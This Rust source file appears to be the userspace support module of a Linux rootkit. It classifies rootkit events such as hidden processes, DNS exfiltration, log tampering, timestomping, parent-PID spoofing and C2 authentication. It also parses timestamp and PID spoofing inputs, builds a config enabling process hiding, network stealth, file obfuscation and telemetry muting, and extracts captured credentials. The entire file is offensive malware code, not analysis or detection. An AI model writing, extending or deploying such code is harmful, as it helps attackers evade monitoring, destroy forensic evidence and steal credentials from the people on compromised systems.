use common::{
    CredentialCapture, EventHeader, RootkitConfig, TimestompEntry, EVENT_ANCESTRY_SPOOFED,
    EVENT_ANTI_DETACH, EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED,
    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN,
    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
};

#[derive(Debug, Clone, PartialEq)]
pub enum EventClassification {
    ProcessHidden { pid: u32 },
    PacketIntercepted { cmd_type: u32, arg: u64 },
    FileObfuscated { pid: u32, inode: u64 },
    LogTampered { pid: u32, bytes: u64 },
    AncestrySpoofed { pid: u32, fake_ppid: u64 },
    DnsExfil { seq: u64 },
    KallsymsHidden { pid: u32, inode: u64 },
    AntiDetach { pid: u32, cmd: u64 },
    Timestomped { pid: u32, inode: u64 },
    C2AuthFailed { encrypted: u64 },
    TelemetryMuted { pid: u32 },
    Unknown { event_type: u32 },
}

pub fn classify_event(event: &EventHeader) -> EventClassification {
    match event.event_type {
        EVENT_PROC_HIDDEN => EventClassification::ProcessHidden { pid: event.pid },
        EVENT_PACKET_INTERCEPTED => EventClassification::PacketIntercepted {
            cmd_type: event.pid,
            arg: event.context,
        },
        EVENT_FILE_OBFUSCATED => EventClassification::FileObfuscated {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_LOG_TAMPERED => EventClassification::LogTampered {
            pid: event.pid,
            bytes: event.context,
        },
        EVENT_ANCESTRY_SPOOFED => EventClassification::AncestrySpoofed {
            pid: event.pid,
            fake_ppid: event.context,
        },
        EVENT_DNS_EXFIL => EventClassification::DnsExfil { seq: event.context },
        EVENT_KALLSYMS_HIDDEN => EventClassification::KallsymsHidden {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_ANTI_DETACH => EventClassification::AntiDetach {
            pid: event.pid,
            cmd: event.context,
        },
        EVENT_TIMESTOMPED => EventClassification::Timestomped {
            pid: event.pid,
            inode: event.context,
        },
        EVENT_C2_AUTH_FAILED => EventClassification::C2AuthFailed {
            encrypted: event.context,
        },
        EVENT_TELEMETRY_MUTED => EventClassification::TelemetryMuted { pid: event.pid },
        _ => EventClassification::Unknown {
            event_type: event.event_type,
        },
    }
}

pub fn parse_tty_device(s: &str) -> Option<(u32, u32)> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 2 {
        return None;
    }
    let major = parts[0].parse::<u32>().ok()?;
    let minor = parts[1].parse::<u32>().ok()?;
    Some((major, minor))
}

pub fn parse_spoof_ppid(s: &str) -> Option<(u32, u32)> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 2 {
        return None;
    }
    let pid = parts[0].parse::<u32>().ok()?;
    let fake_ppid = parts[1].parse::<u32>().ok()?;
    Some((pid, fake_ppid))
}

pub fn parse_timestomp(s: &str) -> Option<(u64, TimestompEntry)> {
    let parts: Vec<&str> = s.split(':').collect();
    if parts.len() != 4 {
        return None;
    }
    let inode = parts[0].parse::<u64>().ok()?;
    let atime = parts[1].parse::<u64>().ok()?;
    let mtime = parts[2].parse::<u64>().ok()?;
    let ctime = parts[3].parse::<u64>().ok()?;

    Some((
        inode,
        TimestompEntry {
            fake_mtime_sec: mtime,
            fake_atime_sec: atime,
            fake_ctime_sec: ctime,
        },
    ))
}

pub fn make_rootkit_config(self_pid: u32) -> RootkitConfig {
    RootkitConfig {
        self_pid,
        hide_procs: 1,
        net_stealth: 1,
        file_obfuscate: 1,
        mute_telemetry: 1,
        _pad: [0u8; 4],
    }
}

pub fn tty_dev_key(major: u32, minor: u32) -> u64 {
    ((major as u64) << 32) | (minor as u64)
}

pub fn credential_data(capture: &CredentialCapture) -> &[u8] {
    &capture.data[..capture.data_len as usize]
}
